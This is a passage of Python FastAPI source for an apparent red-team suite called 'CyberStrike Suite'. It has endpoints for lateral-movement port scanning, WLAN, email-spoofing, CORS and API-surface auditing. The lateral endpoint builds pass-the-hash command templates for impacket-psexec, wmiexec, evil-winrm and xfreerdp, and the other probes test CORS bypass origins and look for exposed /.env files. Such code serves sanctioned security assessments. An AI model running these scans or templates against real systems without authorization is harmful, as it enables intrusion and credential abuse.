        "requested_os_profile": os_type,
        "high_risk_token_privileges_count": len(high_risk_privs),
        "live_token_privileges": live_privileges,
        "unquoted_service_paths_found": unquoted_service_paths,
        "always_install_elevated": always_install_elevated,
        "writable_path_directories": writable_path_dirs[:25]
    })

# ── 16. Live Target Lateral Movement Port, Protocol & Banner Scanner ─
@app.post("/api/redteam/lateral")
async def redteam_lateral(req: RedTeamRequest):
    raw_ip   = (req.options.get("target_ip") or "127.0.0.1").strip()
    clean_ip = re.sub(r'^https?://', '', raw_ip).split('/')[0].split(':')[0]
    domain   = req.options.get("domain") or "WORKGROUP"
    username = req.options.get("username") or "administrator"
    lhost    = req.options.get("lhost") or "127.0.0.1"

    lateral_ports = [
        (22,   "SSH",          "SSH Remote Shell / Key Reuse"),
        (80,   "HTTP",         "Web Application / Reverse Proxy"),
        (88,   "Kerberos",     "Active Directory Kerberos KDC (Pass-the-Ticket)"),
        (135,  "MS-RPC",       "DCE/RPC Endpoint Mapper (WMI / DCOM Execution)"),
        (139,  "NetBIOS-SSN",  "NetBIOS Session Service"),
        (389,  "LDAP",         "Active Directory LDAP Directory"),
        (443,  "HTTPS",        "TLS Web / Management Interface"),
        (445,  "SMB",          "Server Message Block (PsExec / Pass-the-Hash / SMBExec)"),
        (1433, "MSSQL",        "Microsoft SQL Server (xp_cmdshell)"),
        (3306, "MySQL",        "MySQL Database Transport"),
        (3389, "RDP",          "Remote Desktop Protocol (RestrictedAdmin PTH)"),
        (5432, "PostgreSQL",   "PostgreSQL Database Transport"),
        (5985, "WinRM-HTTP",   "Windows Remote Management HTTP (Evil-WinRM)"),
        (5986, "WinRM-HTTPS",  "Windows Remote Management HTTPS (Evil-WinRM SSL)"),
        (8081, "HTTP-Alt-8081","Local HTTP Service (8081)"),
        (8083, "HTTP-Alt-8083","TestMe Honeypot Service (8083)"),
    ]

    open_vectors: List[Dict[str, Any]] = []
    closed_ports: List[int] = []

    async def _probe_lateral_port(port: int, proto: str, vector_desc: str):
        t0 = time.time()
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(clean_ip, port), timeout=1.2)
            rtt_ms = round((time.time() - t0) * 1000, 1)
            banner = ""
            try:
                if port in (80, 5985, 8081, 8083):
                    writer.write(f"HEAD / HTTP/1.1\r\nHost: {clean_ip}\r\nConnection: close\r\n\r\n".encode())
                    await writer.drain()
                data = await asyncio.wait_for(reader.read(160), timeout=0.6)
                if data:
                    banner = data.decode("utf-8", errors="replace").splitlines()[0][:100].strip()
            except Exception:
                pass
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            cmd_hint = ""
            if port == 445:
                cmd_hint = f"impacket-psexec {domain}/{username}@{clean_ip} -hashes :<NTLM>"
            elif port in (5985, 5986):
                cmd_hint = f"evil-winrm -i {clean_ip} -u {username} -H <NTLM>"
            elif port == 135:
                cmd_hint = f"impacket-wmiexec {domain}/{username}@{clean_ip} -hashes :<NTLM>"
            elif port == 22:
                cmd_hint = f"ssh {username}@{clean_ip}"
            elif port == 3389:
                cmd_hint = f"xfreerdp /v:{clean_ip} /u:{username} /d:{domain} /pth:<NTLM>"

            open_vectors.append({
                "port": port,
                "service": proto,
                "state": "OPEN",
                "rtt_ms": rtt_ms,
                "banner": banner or "TCP SYN/ACK Verified",
                "lateral_vector": vector_desc,
                "command_template": cmd_hint
            })
        except Exception:
            closed_ports.append(port)

    await asyncio.gather(*[_probe_lateral_port(p, s, d) for p, s, d in lateral_ports])
    open_vectors.sort(key=lambda x: x["port"])

    return JSONResponse(content={
        "target_ip": clean_ip,
        "domain": domain,
        "username": username,
        "lhost": lhost,
        "probed_ports_count": len(lateral_ports),
        "open_lateral_vectors_count": len(open_vectors),
        "open_lateral_vectors": open_vectors,
        "closed_or_filtered_ports": sorted(closed_ports)
    })

@app.api_route("/api/recon/wifi-audit", methods=["GET", "POST"])
async def wifi_security_audit():
    """Passive WLAN posture & 802.11w (PMF) compliance auditor."""
    networks: List[Dict[str, Any]] = []
    try:
        proc = await asyncio.create_subprocess_exec(
            "netsh", "wlan", "show", "networks", "mode=bssid",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=6.0)
        text = stdout.decode("utf-8", errors="replace")
        current: Optional[Dict[str, Any]] = None
        for raw_line in text.splitlines():
            line = raw_line.strip()
            if line.startswith("SSID ") and ":" in line:
                if current:
                    networks.append(current)
                ssid_val = line.split(":", 1)[1].strip() or "<Hidden SSID>"
                current = {"ssid": ssid_val, "auth": "Unknown", "encryption": "Unknown", "bssids": []}
            elif current is not None:
                if line.startswith("Authentication") and ":" in line:
                    current["auth"] = line.split(":", 1)[1].strip()
                elif line.startswith("Encryption") and ":" in line:
                    current["encryption"] = line.split(":", 1)[1].strip()
                elif line.startswith("BSSID ") and ":" in line:
                    bssid_mac = line.split(":", 1)[1].strip()
                    current["bssids"].append({"bssid": bssid_mac, "signal": "N/A", "channel": "N/A", "radio": "N/A"})
                elif line.startswith("Signal") and ":" in line and current["bssids"]:
                    current["bssids"][-1]["signal"] = line.split(":", 1)[1].strip()
                elif line.startswith("Channel") and ":" in line and current["bssids"]:
                    current["bssids"][-1]["channel"] = line.split(":", 1)[1].strip()
                elif line.startswith("Radio type") and ":" in line and current["bssids"]:
                    current["bssids"][-1]["radio"] = line.split(":", 1)[1].strip()
        if current:
            networks.append(current)
    except Exception:
        pass

    for net in networks:
        auth_upper = net["auth"].upper()
        if "WPA3" in auth_upper:
            net["pmf_80211w"] = "Mandatory (Protected)"
            net["risk"] = "low"
        elif "WPA2" in auth_upper:
            net["pmf_80211w"] = "Optional (Verify 802.11w enabled)"
            net["risk"] = "medium"
        else:
            net["pmf_80211w"] = "Unprotected"
            net["risk"] = "high"

    return JSONResponse(content={
        "scanned_at": datetime.now().isoformat(),
        "network_count": len(networks),
        "networks": networks
    })


@app.post("/api/recon/email-security")
async def recon_email_security(req: ReconRequest):
    """Passive DMARC, SPF, DKIM & MX Anti-Spoofing Posture Auditor."""
    domain = re.sub(r'^https?://', '', req.target.strip()).split('/')[0].split(':')[0]
    spf_records: List[str] = []
    dmarc_records: List[str] = []
    mx_records: List[str] = []
    dkim_found: Dict[str, str] = {}

    def _resolve_dns():
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3.0
        resolver.lifetime = 3.0
        try:
            for r in resolver.resolve(domain, "MX"):
                mx_records.append(str(r.exchange).rstrip("."))
        except Exception:
            pass
        try:
            for r in resolver.resolve(domain, "TXT"):
                txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
                if "v=spf1" in txt.lower():
                    spf_records.append(txt)
        except Exception:
            pass
        try:
            for r in resolver.resolve(f"_dmarc.{domain}", "TXT"):
                txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
                if "v=dmarc1" in txt.lower():
                    dmarc_records.append(txt)
        except Exception:
            pass
        for sel in ("default", "google", "selector1", "selector2", "k1", "mail"):
            try:
                ans = resolver.resolve(f"{sel}._domainkey.{domain}", "TXT")
                for r in ans:
                    txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
                    dkim_found[sel] = txt[:120]
            except Exception:
                pass

    await asyncio.to_thread(_resolve_dns)

    spf_str = spf_records[0] if spf_records else ""
    dmarc_str = dmarc_records[0] if dmarc_records else ""
    spoofable = True
    issues = []

    if not spf_str:
        issues.append("Missing SPF TXT record (v=spf1) on root domain")
    elif "+all" in spf_str:
        issues.append("Critical: SPF uses '+all' (allows any IP to send mail as domain)")
    elif "~all" in spf_str:
        issues.append("SPF uses SoftFail ('~all') instead of strict Fail ('-all')")

    if not dmarc_str:
        issues.append(f"Missing DMARC record at _dmarc.{domain}")
    elif "p=none" in dmarc_str.lower():
        issues.append("DMARC policy is 'p=none' (monitoring only — spoofed emails are not blocked)")
    elif "p=reject" in dmarc_str.lower() or "p=quarantine" in dmarc_str.lower():
        spoofable = False

    grade = "A" if (not spoofable and "-all" in spf_str) else ("B" if not spoofable else ("C" if (spf_str or dmarc_str) else "F"))

    return JSONResponse(content={
        "domain": domain,
        "anti_spoofing_grade": grade,
        "spoofable": spoofable,
        "mx_servers": mx_records,
        "spf_record": spf_str or "Absent",
        "dmarc_record": dmarc_str or "Absent",
        "dkim_selectors_detected": dkim_found,
        "findings": issues or ["Strict SPF and DMARC enforcement verified"]
    })


@app.post("/api/recon/cors-matrix")
async def recon_cors_matrix(req: ReconRequest):
    """Multi-Origin CORS Trust Matrix Auditor."""
    url = format_url(req.target.strip())
    host = re.sub(r'^https?://', '', url).split('/')[0].split(':')[0]
    origins = [
        ("Arbitrary External Origin", "https://external-auditor.invalid"),
        ("Null Origin (Sandboxed Iframe)", "null"),
        ("Subdomain Prefix Bypass", f"https://{host}.external-auditor.invalid"),
        ("Unanchored Suffix Bypass", f"https://evil{host}"),
        ("HTTP Downgrade Origin", f"http://{host}"),
        ("Same-Host Local Port", f"http://{host}:8080"),
    ]
    matrix = []
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for label, origin_val in origins:
            try:
                async with session.options(
                    url,
                    headers={
                        "Origin": origin_val,
                        "Access-Control-Request-Method": "POST",
                        "Access-Control-Request-Headers": "Authorization, Content-Type"
                    },
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    acao = resp.headers.get("Access-Control-Allow-Origin", "None")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "false")
                    trusted = acao in (origin_val, "*")
                    risk = "CRITICAL" if (trusted and acac.lower() == "true" and acao != "*") else ("HIGH" if trusted else "SAFE")
                    matrix.append({
                        "test_case": label,
                        "origin_sent": origin_val,
                        "status_code": resp.status,
                        "allow_origin": acao,
                        "allow_credentials": acac,
                        "trusted": trusted,
                        "risk": risk
                    })
            except Exception as e:
                matrix.append({"test_case": label, "origin_sent": origin_val, "error": str(e), "risk": "UNKNOWN"})

    vulnerable_cases = [m for m in matrix if m.get("risk") in ("CRITICAL", "HIGH")]
    return JSONResponse(content={
        "target": url,
        "vulnerable_count": len(vulnerable_cases),
        "cors_matrix": matrix
    })


@app.post("/api/recon/api-discovery")
async def recon_api_discovery(req: ReconRequest):
    """OpenAPI, GraphQL, Actuator & Well-Known API Surface Discovery."""
    base = format_url(req.target.strip()).rstrip('/')
    paths = [
        ("/openapi.json", "OpenAPI 3.0 Specification"),
        ("/swagger.json", "Swagger 2.0 Specification"),
        ("/docs", "FastAPI / Swagger UI"),
        ("/redoc", "ReDoc API Documentation"),
        ("/graphql", "GraphQL Endpoint"),
        ("/api/status", "API Status Telemetry"),
        ("/api/users/1", "REST User Resource"),
        ("/api/comments", "REST Comments Resource"),
        ("/actuator/health", "Spring Boot Actuator Health"),
        ("/actuator/env", "Spring Boot Actuator Environment"),
        ("/metrics", "Prometheus Metrics Exporter"),
        ("/.well-known/security.txt", "RFC 9116 Security Policy"),
        ("/.well-known/openid-configuration", "OIDC Discovery Metadata"),
        ("/robots.txt", "Robots Exclusion Policy"),
        ("/sitemap.xml", "XML Sitemap"),
        ("/.env", "Dotenv Configuration Exposure"),
    ]
    discovered = []
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def _probe(p: str, desc: str):
            t0 = time.time()
            try:
                async with session.get(f"{base}{p}", allow_redirects=False, timeout=aiohttp.ClientTimeout(total=4)) as r:
                    body = await r.read()
                    elapsed_ms = round((time.time() - t0) * 1000, 1)
                    if r.status in (200, 201, 206, 401, 403, 405):
                        discovered.append({
                            "path": p,
                            "classification": desc,
                            "status": r.status,
                            "content_type": r.headers.get("Content-Type", "unknown"),
                            "bytes": len(body),
                            "latency_ms": elapsed_ms,
                            "accessible": r.status in (200, 201, 206)
                        })
            except Exception:
                pass

        await asyncio.gather(*[_probe(p, d) for p, d in paths])

    discovered.sort(key=lambda x: (not x["accessible"], x["path"]))
    return JSONResponse(content={
        "target": base,
        "probed_endpoints": len(paths),
        "discovered_count": len(discovered),
        "endpoints": discovered
    })


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        # Send initial status
        await websocket.send_text(json.dumps({
            "type": "attack_status",
            "data": {"running": metrics["attacks_running"], "attack_type": None, "url": None, "completed": False}
        }))
        while True:
            # Keep connection alive
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

@app.websocket("/ws/dashboard")
async def websocket_dashboard_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    await manager.send_personal_message(json.dumps({"type": "log", "message": "Connected to CyberStrike Suite", "level": "info"}), websocket)
    try:
        while True:
            await websocket.send_json({
                "type": "system_status",
                "status": metrics.get("system_status", "ready"),
                "stats": {
                    "total_requests": metrics["total_requests"],
                    "successful_requests": metrics["successful_requests"],
                    "failed_requests": metrics["failed_requests"]
                }
            })
            await asyncio.sleep(2.0)
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

if __name__ == "__main__":
    uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)